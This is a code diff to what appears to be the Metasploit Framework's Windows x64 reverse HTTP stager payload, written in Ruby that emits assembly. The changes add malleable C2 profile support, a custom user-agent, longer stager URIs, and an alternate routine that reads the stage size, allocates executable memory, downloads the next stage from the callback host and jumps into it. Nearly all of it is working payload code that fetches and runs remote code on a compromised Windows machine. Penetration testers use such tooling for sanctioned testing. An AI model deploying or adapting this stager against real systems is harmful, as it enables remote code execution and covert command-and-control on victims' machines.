@@ -21,6 +21,9 @@ module Payload::Windows::ReverseHttp_x64
   #
   def initialize(*args)
     super
+    register_options([
+      OptPath.new('MALLEABLEC2', [false, 'Path to a file containing the malleable C2 profile'])
+    ])
     register_advanced_options(
       [ OptInt.new('StagerURILength', 'The URI length for the stager (at least 5 bytes)') ] +
       Msf::Opt::stager_retry_options +
@@ -48,7 +51,7 @@ module Payload::Windows::ReverseHttp_x64
     }
 
     # add extended options if we do have enough space
-    if self.available_space.nil? || required_space <= self.available_space
+    if self.available_space.nil? || (cached_size && required_space <= self.available_space)
       conf[:url]        = luri + generate_uri(opts)
       conf[:exitfunk]   = ds['EXITFUNC']
       conf[:ua]         = ds['HttpUserAgent']
@@ -62,7 +65,7 @@ module Payload::Windows::ReverseHttp_x64
       # Otherwise default to small URIs
       conf[:url]        = luri + generate_small_uri
     end
-
+  
     generate_reverse_http(conf)
   end
 
@@ -122,7 +125,7 @@ module Payload::Windows::ReverseHttp_x64
   # Generate the URI for the initial stager
   #
   def generate_small_uri
-    generate_uri_uuid_mode(:init_native, 5)
+    generate_uri_uuid_mode(:init_native, 30)
   end
 
   #
@@ -168,6 +171,7 @@ module Payload::Windows::ReverseHttp_x64
   # @option opts [String] :url The URI to request during staging
   # @option opts [String] :host The host to connect to
   # @option opts [Integer] :port The port to connect to
+  # @option opts [String] :ua The User Agent the payload will use
   # @option opts [String] :exitfunk The exit method to use if there is an error, one of process, thread, or seh
   # @option opts [String] :proxy_host The optional proxy server host to use
   # @option opts [Integer] :proxy_port The optional proxy server port to use
@@ -239,14 +243,26 @@ module Payload::Windows::ReverseHttp_x64
         mov r14, 'wininet'
         push r14                      ; Push 'wininet',0 onto the stack
         mov rcx, rsp                  ; lpFileName (stackpointer)
-        mov r10, #{Rex::Text.block_api_hash('kernel32.dll', 'LoadLibraryA')}
+        mov r10d, #{block_api_hash('kernel32.dll', 'LoadLibraryA')}
         call rbp
 
       internetopen:
         push rbx                      ; stack alignment
         push rbx                      ; NULL pointer
-        mov rcx, rsp                  ; lpszAgent ("")
     ^
+
+    if opts[:ua]
+      asm << %Q^
+        call load_useragent
+        db"#{opts[:ua]}", 0x00
+      load_useragent:
+        pop rcx                         ; lpszAgent (stack pointer)
+      ^
+    else
+      asm << %Q^
+        mov rcx, rsp                    ; lpszAgent("")
+      ^
+    end
 
     if proxy_enabled
       asm << %Q^
@@ -269,7 +285,7 @@ module Payload::Windows::ReverseHttp_x64
         xor r9, r9                    ; lpszProxyBypass (NULL)
         push rbx                      ; stack alignment
         push rbx                      ; dwFlags (0)
-        mov r10, #{Rex::Text.block_api_hash('wininet.dll', 'InternetOpenA')}
+        mov r10d, #{block_api_hash('wininet.dll', 'InternetOpenA')}
         call rbp
 
         call load_server_host
@@ -283,7 +299,7 @@ module Payload::Windows::ReverseHttp_x64
         push rbx                      ; dwFlags (0)
         push 3                        ; dwService (3=INTERNET_SERVICE_HTTP)
         push rbx                      ; lpszPassword (NULL)
-        mov r10, #{Rex::Text.block_api_hash('wininet.dll', 'InternetConnectA')}
+        mov r10d, #{block_api_hash('wininet.dll', 'InternetConnectA')}
         call rbp
     ^
 
@@ -303,7 +319,7 @@ module Payload::Windows::ReverseHttp_x64
         pop rdx
         push #{proxy_user.length}     ; dwBufferLength (proxy_user length)
         pop r9
-        mov r10, #{Rex::Text.block_api_hash('wininet.dll', 'InternetSetOptionA')}
+        mov r10d, #{block_api_hash('wininet.dll', 'InternetSetOptionA')}
         call rbp
         ^
       end
@@ -319,7 +335,7 @@ module Payload::Windows::ReverseHttp_x64
         pop rdx
         push #{proxy_pass.length}     ; dwBufferLength (proxy_pass length)
         pop r9
-        mov r10, #{Rex::Text.block_api_hash('wininet.dll', 'InternetSetOptionA')}
+        mov r10d, #{block_api_hash('wininet.dll', 'InternetSetOptionA')}
         call rbp
         ^
       end
@@ -343,7 +359,7 @@ module Payload::Windows::ReverseHttp_x64
         push rax
         push rbx                      ; lplpszAcceptType (NULL)
         push rbx                      ; lpszReferer (NULL)
-        mov r10, #{Rex::Text.block_api_hash('wininet.dll', 'HttpOpenRequestA')}
+        mov r10d, #{block_api_hash('wininet.dll', 'HttpOpenRequestA')}
         call rbp
 
       prepare:
@@ -372,7 +388,7 @@ module Payload::Windows::ReverseHttp_x64
         mov r8, rsp                   ; lpBuffer (pointer to flags)
         push 4
         pop r9                        ; dwBufferLength (4 = size of flags)
-        mov r10, #{Rex::Text.block_api_hash('wininet.dll', 'InternetSetOptionA')}
+        mov r10d, #{block_api_hash('wininet.dll', 'InternetSetOptionA')}
         call rbp
 
         xor r8, r8                    ; dwHeadersLen (0)
@@ -401,14 +417,14 @@ module Payload::Windows::ReverseHttp_x64
         xor r9, r9                    ; lpszVersion (NULL)
         push rbx                      ; stack alignment
         push rbx                      ; dwOptionalLength (0)
-        mov r10, #{Rex::Text.block_api_hash('wininet.dll', 'HttpSendRequestA')}
+        mov r10d, #{block_api_hash('wininet.dll', 'HttpSendRequestA')}
         call rbp
         test eax, eax
         jnz allocate_memory
 
       set_wait:
         mov rcx, #{retry_wait}        ; dwMilliseconds
-        mov r10, #{Rex::Text.block_api_hash('kernel32.dll', 'Sleep')}
+        mov r10d, #{block_api_hash('kernel32.dll', 'Sleep')}
         call rbp                      ; Sleep( dwMilliseconds );
     ^
 
@@ -436,11 +452,63 @@ module Payload::Windows::ReverseHttp_x64
       asm << %Q^
       failure:
         ; hard-coded to ExitProcess(whatever) for size
-        mov r10, #{Rex::Text.block_api_hash('kernel32.dll', 'ExitProcess')}
+        mov r10d, #{block_api_hash('kernel32.dll', 'ExitProcess')}
         call rbp              ; ExitProcess(whatever)
       ^
     end
 
+    # our other recent stagers like reverse_tcp read in the size of the incoming
+    # stage.  We don't know why the http stager still just allocs 4MB and yeets
+    # the stage into it, but we should be allocating what we need, not what we guess we need
+    # these changes are to support the custom payload type, but in the future, we should
+    # change the reverse_http stagers to read in the size and allocate what it needs.
+    # as a breaking change, it will need to wait for the next major release.
+    #
+    if defined?(read_stage_size?) && read_stage_size?
+      asm << %Q^
+      allocate_memory:
+        ; read incoming stage size
+        push rbx                      ; buffer for stage size
+        mov rdx, rsp                  ; lpBuffer (pointer to mem)
+        push rbx                      ; buffer for bytesRead
+        mov r9, rsp                   ; lpdwNumberOfBytesRead (stack pointer)
+        push 4
+        pop r8                        ; dwNumberOfBytesToRead (4 bytes)
+        mov rcx, rsi                  ; hFile (request handle)
+        mov r10d, #{block_api_hash('wininet.dll', 'InternetReadFile')}
+        call rbp
+        test eax, eax                 ; did the download fail?
+        jz failure
+        add rsp, 40                   ; remove 32 bytes of home space and 8 bytes of bytesRead
+        ; allocate memory for stage
+        push rbx
+        pop rcx                       ; lpAddress (NULL)
+        pop rdx                       ; incoming stage size (Used in InternetReadFile)
+        mov rbx, rdx                  ; save off stage size (rdx is volatile)
+        push 0x40
+        pop r9                        ; flProtect (0x40=PAGE_EXECUTE_READWRITE)
+        mov r8, 0x1000                ; flAllocationType (0x1000=MEM_COMMIT)
+        mov r10d, #{block_api_hash('kernel32.dll', 'VirtualAlloc')}
+        call rbp
+        ;download stage
+      download_prep:
+        xchg rax, rbx                 ; store the allocated base in rbx
+        push rbx                      ; store allocated memory address for later ret
+        push rbx                      ; temp storage for byte count
+        mov rdi, rsp                  ; rdi is the &bytesRead
+        mov rcx, rsi                  ; hFile (request handle)
+        mov r8, rax                   ; dwNumberOfBytesToRead (incoming stage size)
+        mov rdx, rbx                  ; lpBuffer (pointer to mem)
+        mov r9, rdi                   ; lpdwNumberOfByteRead (stack pointer)
+        mov r10d, #{block_api_hash('wininet.dll', 'InternetReadFile')}
+        call rbp
+        add rsp, 32                   ; clean up reserved space
+        test eax, eax                 ; did the download fail?
+        jz failure
+        pop rax                       ; clear up reserved space
+    ^
+
+    else
     asm << %Q^
       allocate_memory:
         push rbx
@@ -450,7 +518,7 @@ module Payload::Windows::ReverseHttp_x64
         mov r9, rdx                   ; flProtect (0x40=PAGE_EXECUTE_READWRITE)
         shl edx, 16                   ; dwSize
         mov r8, 0x1000                ; flAllocationType (0x1000=MEM_COMMIT)
-        mov r10, #{Rex::Text.block_api_hash('kernel32.dll', 'VirtualAlloc')}
+        mov r10d, #{block_api_hash('kernel32.dll', 'VirtualAlloc')}
         call rbp
 
       download_prep:
@@ -464,7 +532,7 @@ module Payload::Windows::ReverseHttp_x64
         mov rdx, rbx                  ; lpBuffer (pointer to mem)
         mov r8, 8192                  ; dwNumberOfBytesToRead (8k)
         mov r9, rdi                   ; lpdwNumberOfByteRead (stack pointer)
-        mov r10, #{Rex::Text.block_api_hash('wininet.dll', 'InternetReadFile')}
+        mov r10d, #{block_api_hash('wininet.dll', 'InternetReadFile')}
         call rbp
         add rsp, 32                   ; clean up reserved space
 
@@ -478,6 +546,10 @@ module Payload::Windows::ReverseHttp_x64
         jnz download_more             ; keep going
         pop rax                       ; clear up reserved space
 
+    ^
+    end
+
+    asm << %Q^
       execute_stage:
         ret                           ; return to the stored stage address
     ^
